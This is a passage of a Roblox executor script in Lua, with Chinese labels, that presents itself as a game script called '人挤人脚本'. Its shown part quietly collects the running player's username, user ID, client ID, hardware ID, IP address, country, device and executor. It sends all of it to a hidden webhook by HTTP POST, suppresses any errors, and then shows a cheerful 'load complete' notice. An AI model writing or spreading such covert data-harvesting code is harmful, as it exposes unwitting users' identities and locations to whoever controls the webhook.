        title = string.format("有人正在使用脚本 %s %d时%d分", 
            os.date("%Y年%m月%d日"), 
            tonumber(os.date("%H")), 
            tonumber(os.date("%M"))),
        
        thumbnail = {url = getAvatarImage(userId)},
        
        fields = {
            {name = "用户名", value = localPlayer.Name, inline = true},
            {name = "显示名称", value = localPlayer.DisplayName, inline = true},
            {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
            
            {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
            
            {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
            {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
            
            {name = "注入器", value = getExecutor(), inline = true},
            {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
            
            {name = "设备", value = getDeviceType(), inline = false},
            {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
            {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                   
            {name = "HWID", value = getHWID(), inline = true},
            {name = "IP地址", value = getIPAddress(), inline = true},
            {name = "IP查询", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
        }
    }}
}

local request = http_request or request or HttpPost or (syn and syn.request)
if not request then
    return
end

safeCall(function()
    request({
        Url = GS_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
--结束
-- 加载完成提示
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "人挤人脚本",
    Text = "加载完成 祝您使用愉快",
    Duration = 5;
})
